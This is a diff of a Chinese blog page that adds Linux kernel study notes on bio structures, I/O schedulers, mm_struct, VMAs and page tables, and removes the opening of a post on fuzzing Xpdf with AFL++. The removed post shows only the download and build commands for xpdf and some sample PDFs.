class="comment">/* bio结构体创建者的私有方法 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_BLK_DEV_INTEGRITY)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_integrity_payload</span> *<span class="title">bi_integrity</span>;</span>  <span class="comment">/* data integrity */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">bio_destructor_t</span>    *bi_destructor;    <span class="comment">/* bio撤销方法 */</span></span><br><span class="line">    <span class="comment">/* 内嵌在结构体末尾的bio向量,主要为了防止出现二次申请少量的bio_vecs */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span>        <span class="title">bi_inline_vecs</span>[0];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>bio 结构体：表示正在执行的 I/O 操作相关的信息</li>
+<li>bi_io_vec 链表：表示当前 I/O 操作涉及到的内存页（每个 bio_vec 都是对应一个页面，从而保证内核能够方便高效的完成 I/O 操作）</li>
+<li>bio_vec 结构体：表示 I/O 操作使用的片段</li>
+<li>bi_vcnt：表示 bi_io_vec 链表中 bi_vec 的个数</li>
+<li>bi_idx：表示当前的 bi_vec 片段，通过 bi_vcnt（总数）和 bi_idx（当前数），就可以跟踪当前 I/O 操作的进度</li>
+</ul>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661472333928.png" class width="1661472333928"> 
+<p><strong>内核I/O调度</strong></p>
+<ul>
+<li>Linus 电梯：<ul>
+<li>为了保证磁盘寻址的效率，一般会尽量让磁头向一个方向移动，等到头了再反过来移动，这样可以缩短所有请求的磁盘寻址总时间</li>
+<li>磁头的移动有点类似于电梯，所以这个 I/O 调度算法也叫电梯调度</li>
+</ul>
+</li>
+<li>最终期限I/O调度：<ul>
+<li>最终期限I/O调度算法类似于 Linus 电梯，但是给每个请求设置了超时时间，默认情况下，读请求的超时时间500ms，写请求的超时时间是5s</li>
+</ul>
+</li>
+<li>预测I/O调度：<ul>
+<li>基于最终期限I/O调度算法，新的读请求提交后，并不立即进行请求处理，而是有意等待片刻(默认是6ms)</li>
+<li>等待期间如果有其他对磁盘相邻位置进行读操作的读请求加入，会立刻处理这些读请求</li>
+<li>等待期间如果没有其他读请求加入，那么等待时间相当于浪费掉</li>
+</ul>
+</li>
+<li>完全公正的排队I/O调度：<ul>
+<li>完全公正的排队（Complete Fair Queuing，CFQ）I/O调度，是为专有工作负荷设计的，它和之前提到的I/O调度有根本的不同</li>
+<li>CFQ I/O调度算法中，每个进程都有自己的I/O队列</li>
+<li>CFQ I/O调度程序以时间片轮转调度队列，从每个队列中选取一定的请求数（默认4个），然后进行下一轮调度</li>
+</ul>
+</li>
+<li>空操作的I/O调度：<ul>
+<li>空操作I/O调度几乎不做什么事情，这也是它这样命名的原因</li>
+<li>空操作I/O调度只做一件事情，当有新的请求到来时，把它与任一相邻的请求合并</li>
+</ul>
+</li>
+</ul>
+<p>Linux 内核中内置了上面4种I/O调度，可以在启动时通过命令行选项 <code>elevator=xxx</code> 来启用任何一种</p>
+<p>elevator 选项参数如下:</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>参数</strong></th>
+<th><strong>I/O调度程序</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>as</td>
+<td>预测</td>
+</tr>
+<tr>
+<td>cfq</td>
+<td>完全公正排队</td>
+</tr>
+<tr>
+<td>deadline</td>
+<td>最终期限</td>
+</tr>
+<tr>
+<td>noop</td>
+<td>空操作</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="进程地址空间"><a href="#进程地址空间" class="headerlink" title="进程地址空间"></a>进程地址空间</h2><p><strong>地址空间</strong></p>
+<p>进程地址空间也就是每个进程所使用的内存（就是每个进程所能访问的虚拟内存地址范围），内核对进程地址空间的管理，也就是对用户态程序的内存管理</p>
+<ul>
+<li>现代的操作系统中进程都是在保护模式下运行的，地址空间其实是操作系统给进程用的一段连续的虚拟内存空间</li>
+<li>地址空间最终会通过页表映射到物理内存上，因为内核操作的是物理内存</li>
+</ul>
+<p>虽然地址空间的范围很大，但是进程也不一定有权限访问全部的地址空间（一般都是只能访问地址空间中的一些地址区间），进程能够访问的那些地址区间也称为 [内存区域]，进程如果访问了有效内存区域以外的内容就会报 “段错误” 信息</p>
+<ul>
+<li>[内存区域]：进程能够访问的那些 [地址区间]</li>
+</ul>
+<p>内存区域中主要包含以下信息：</p>
+<ul>
+<li>代码段 (text section)，即可执行文件代码的内存映射</li>
+<li>数据段 (data section)，即可执行文件的已初始化全局变量的内存映射</li>
+<li>bss 段的零页 (页面信息全是“0”值)，即未初始化全局变量的内存映射</li>
+<li>进程用户空间栈的零页内存映射</li>
+<li>进程使用的C库或者动态链接库等共享库的代码段，数据段和bss段的内存映射</li>
+<li>任何内存映射文件</li>
+<li>任何共享内存段</li>
+<li>任何匿名内存映射，比如由 malloc() 分配的内存</li>
+</ul>
+<p>linux 中的地址空间是用 mm_struct 来表示的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap</span>;</span>        <span class="comment">/* [内存区域]链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mm_rb</span>;</span>               <span class="comment">/* [内存区域]红黑树 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> * <span class="title">mmap_cache</span>;</span>    <span class="comment">/* 最近一次访问的[内存区域] */</span></span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span> <span class="params">(struct file *filp,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span>;  <span class="comment">/* 获取指定区间内一个还未映射的地址，出错时返回错误码 */</span></span><br><span class="line">    <span class="keyword">void</span> (*unmap_area) (struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr);  <span class="comment">/* 取消地址 addr 的映射 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_base;        <span class="comment">/* 地址空间中可以用来映射的首地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> task_size;        <span class="comment">/* 进程的虚拟地址空间大小 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cached_hole_size;     <span class="comment">/* 如果不空的话，就是 free_area_cache 后最大的空洞 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> free_area_cache;        <span class="comment">/* 地址空间的第一个空洞 */</span></span><br><span class="line">    <span class="keyword">pgd_t</span> * pgd;                        <span class="comment">/* 页全局目录 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> mm_users;            <span class="comment">/* 使用地址空间的用户数 */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> mm_count;            <span class="comment">/* 实际使用地址空间的计数， (users count as 1) */</span></span><br><span class="line">    <span class="keyword">int</span> map_count;                <span class="comment">/* [内存区域]个数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">mmap_sem</span>;</span>   <span class="comment">/* 内存区域信号量 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span> page_table_lock;        <span class="comment">/* 页表锁 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">mmlist</span>;</span>        <span class="comment">/* 所有地址空间形成的链表 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Special counters, in some configurations protected by the</span></span><br><span class="line"><span class="comment">     * page_table_lock, in other configurations by being atomic.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">mm_counter_t</span> _file_rss;</span><br><span class="line">    <span class="keyword">mm_counter_t</span> _anon_rss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_rss;    <span class="comment">/* High-watermark of RSS usage */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> hiwater_vm;    <span class="comment">/* High-water virtual memory usage */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> total_vm, locked_vm, shared_vm, exec_vm;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_vm, reserved_vm, def_flags, nr_ptes;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start_code, end_code, start_data, end_data; <span class="comment">/* 代码段，数据段的开始和结束地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> start_brk, brk, start_stack; <span class="comment">/* 堆的首地址，尾地址，进程栈首地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> arg_start, arg_end, env_start, env_end; <span class="comment">/* 命令行参数，环境变量首地址，尾地址 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="comment">/* for /proc/PID/auxv */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_binfmt</span> *<span class="title">binfmt</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">cpumask_t</span> cpu_vm_mask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Architecture-specific MM context */</span></span><br><span class="line">    <span class="keyword">mm_context_t</span> context;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Swap token stuff */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Last value of global fault stamp as seen by this process.</span></span><br><span class="line"><span class="comment">     * In other words, this value gives an indication of how long</span></span><br><span class="line"><span class="comment">     * it has been since this task got the token.</span></span><br><span class="line"><span class="comment">     * Look at mm/thrash.c</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> faultstamp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> token_priority;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> last_interval;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags; <span class="comment">/* Must use atomic bitops to access the bits */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">core_state</span> *<span class="title">core_state</span>;</span> <span class="comment">/* coredumping support */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_AIO</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        ioctx_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>    <span class="title">ioctx_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MM_OWNER</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * &quot;owner&quot; points to a task that is regarded as the canonical</span></span><br><span class="line"><span class="comment">     * user/owner of this mm. All of the following must be true in</span></span><br><span class="line"><span class="comment">     * order for it to be changed:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * current == mm-&gt;owner</span></span><br><span class="line"><span class="comment">     * current-&gt;mm != mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;mm == mm</span></span><br><span class="line"><span class="comment">     * new_owner-&gt;alloc_lock is held</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PROC_FS</span></span><br><span class="line">    <span class="comment">/* store ref to file /proc/&lt;pid&gt;/exe symlink points to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">exe_file</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> num_exe_file_vmas;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU_NOTIFIER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmu_notifier_mm</span> *<span class="title">mmu_notifier_mm</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>mm_users：就是 mm_struct 被用户空间进程(线程)引用的次数 </li>
+<li>mm_count：其实它记录就是 mm_struct 实际的引用计数 <ul>
+<li>当 mm_users=0 时，并不一定能释放此 mm_struct，只有当 mm_count=0 时，才可以确定释放此 mm_struct</li>
+<li>如果只有1个进程使用 mm_struct，那么 mm_users=1，mm_count也是 1</li>
+<li>如果有9个线程在使用 mm_struct，那么 mm_users=9，而 mm_count 仍然为 1</li>
+</ul>
+</li>
+</ul>
+<p><strong>虚拟内存区域(VMA)</strong></p>
+<p>[内存区域]（进程能够访问的那些 [地址区间]）在 linux 中也被称为 [虚拟内存区域]（VMA），它其实就是进程地址空间上一段连续的内存范围</p>
+<p>结构体如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> * <span class="title">vm_mm</span>;</span>    <span class="comment">/* 相关的 mm_struct 结构体 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;        <span class="comment">/* 内存区域首地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;        <span class="comment">/* 内存区域尾地址 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* linked list of VM areas per task, sorted by address */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>, *<span class="title">vm_prev</span>;</span>  <span class="comment">/* VMA链表 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pgprot_t</span> vm_page_prot;        <span class="comment">/* 访问控制权限 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;        <span class="comment">/* 标志 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span>       <span class="comment">/* 树上的VMA节点 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For areas with an address space and backing store,</span></span><br><span class="line"><span class="comment">     * linkage into the address_space-&gt;i_mmap prio tree, or</span></span><br><span class="line"><span class="comment">     * linkage to the list of like vmas hanging off its node, or</span></span><br><span class="line"><span class="comment">     * linkage of vma in the address_space-&gt;i_mmap_nonlinear list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">            <span class="keyword">void</span> *parent;    <span class="comment">/* aligns with prio_tree_node parent */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">head</span>;</span></span><br><span class="line">        &#125; vm_set;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">raw_prio_tree_node</span> <span class="title">prio_tree_node</span>;</span></span><br><span class="line">    &#125; shared;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * A file&#x27;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span></span><br><span class="line"><span class="comment">     * list, after a COW of one of the file pages.    A MAP_SHARED vma</span></span><br><span class="line"><span class="comment">     * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span></span><br><span class="line"><span class="comment">     * or brk vma (with NULL file) can only be in an anon_vma list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_node</span>;</span>    <span class="comment">/* Serialized by anon_vma-&gt;lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span>    <span class="comment">/* Serialized by page_table_lock */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function pointers to deal with this struct. */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information about our backing store: */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;        <span class="comment">/* Offset (within vm_file) in PAGE_SIZE</span></span><br><span class="line"><span class="comment">                       units, *not* PAGE_CACHE_SIZE */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span>        <span class="comment">/* File we map to (can be NULL). */</span></span><br><span class="line">    <span class="keyword">void</span> * vm_private_data;        <span class="comment">/* was vm_pte (shared mem) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> vm_truncate_count;<span class="comment">/* truncate_count or restart_addr */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">vm_region</span>;</span>    <span class="comment">/* NOMMU mapping region */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span>    <span class="comment">/* NUMA policy for the VMA */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>地址空间和页表</strong></p>
+<p>地址空间中的地址都是虚拟内存中的地址，而CPU需要操作的是物理内存（内核操作的也是物理内存），所以需要一个将虚拟地址映射到物理地址的机制</p>
+<p>这个机制就是页表，linux 中使用3级页面来完成虚拟地址到物理地址的转换</p>
+<ul>
+<li>PGD - 全局页目录，包含一个 pgd_t 类型数组，多数体系结构中 pgd_t 类型就是一个无符号长整型</li>
+<li>PMD - 中间页目录，它是个 pmd_t 类型数组</li>
+<li>PTE - 简称页表，包含一个 pte_t 类型的页表项，该页表项指向物理页面</li>
+</ul>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661508765929.png" class width="1661508765929"> 
 
       
     </div>
@@ -2340,215 +2810,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/14/Fuzz%20Lab1-Xpdf/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/14/Fuzz%20Lab1-Xpdf/" class="post-title-link" itemprop="url">Fuzz Lab1-Xpdf</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-08-14 12:06:01 / Modified: 13:25:01" itemprop="dateCreated datePublished" datetime="2022-08-14T12:06:01+08:00">2022-08-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>7.6k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>7 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Fuzz-Lab1：Xpdf"><a href="#Fuzz-Lab1：Xpdf" class="headerlink" title="Fuzz-Lab1：Xpdf"></a>Fuzz-Lab1：Xpdf</h2><p>本次实验我们将对 <strong>Xpdf</strong>（一款 PDF 转换解析工具）进行 fuzz，目标是在 <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2019-13288/"><strong>CVE-2019-13288</strong></a> 中发现一个 crash/PoC </p>
-<ul>
-<li>CVE-2019-13288 是一个漏洞，可能会通过精心制作的 payload 文件导致无限递归</li>
-<li>由于程序中每个被调用的函数都会在栈上分配一个栈帧，如果一个函数被递归调用这么多次，就会导致栈内存耗尽和程序崩溃</li>
-<li>因此，远程攻击者可以利用它进行 DoS 攻击</li>
-</ul>
-<p>学习的目标：</p>
-<ul>
-<li>使用 instrumentation 工具编译目标应用程序</li>
-<li>运行模糊器（afl-fuzz）</li>
-<li>使用调试器（GDB）对崩溃进行分类</li>
-</ul>
-<h2 id="Download-and-build-your-target"><a href="#Download-and-build-your-target" class="headerlink" title="Download and build your target"></a>Download and build your target</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME # 创建目录</span><br><span class="line">mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/</span><br><span class="line">sudo apt install build-essential</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz # 获取xpdf</span><br><span class="line">tar -xvzf xpdf-3.02.tar.gz</span><br><span class="line"></span><br><span class="line">cd xpdf-3.02 # 编译&amp;安装xpdf</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install -y build-essential gcc</span><br><span class="line">./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">cd $HOME/fuzzing_xpdf # 下载一些PDF示例</span><br><span class="line">mkdir pdf_examples &amp;&amp; cd pdf_examples</span><br><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget http://www.africau.edu/images/default/sample.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</span><br></pre></td></tr></table></figure>
-<ul>
-<li>我们可以使用以下命令测试 pdfinfo 二进制文件：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  pdf_examples $HOME/fuzzing_xpdf/install/bin/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf</span><br><span class="line">Tagged:         no</span><br><span class="line">Pages:          1</span><br><span class="line">Encrypted:      no</span><br><span class="line">Page size:      200 x 200 pts</span><br><span class="line">MediaBox:           0.00     0.00   200.00   200.00</span><br><span class="line">CropBox:            0.00     0.00   200.00   200.00</span><br><span class="line">BleedBox:           0.00     0.00   200.00   200.00</span><br><span class="line">TrimBox:            0.00     0.00   200.00   200.00</span><br><span class="line">ArtBox:             0.00     0.00   200.00   200.00</span><br><span class="line">File size:      678 bytes</span><br><span class="line">Optimized:      no</span><br><span class="line">PDF version:    1.7</span><br></pre></td></tr></table></figure>
-<h2 id="Install-AFL"><a href="#Install-AFL" class="headerlink" title="Install AFL++"></a>Install AFL++</h2><p>在本课程中，我们将使用最新版本的 <a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus">AFL++ fuzzer</a> ，您可以通过两种方式安装所有内容：</p>
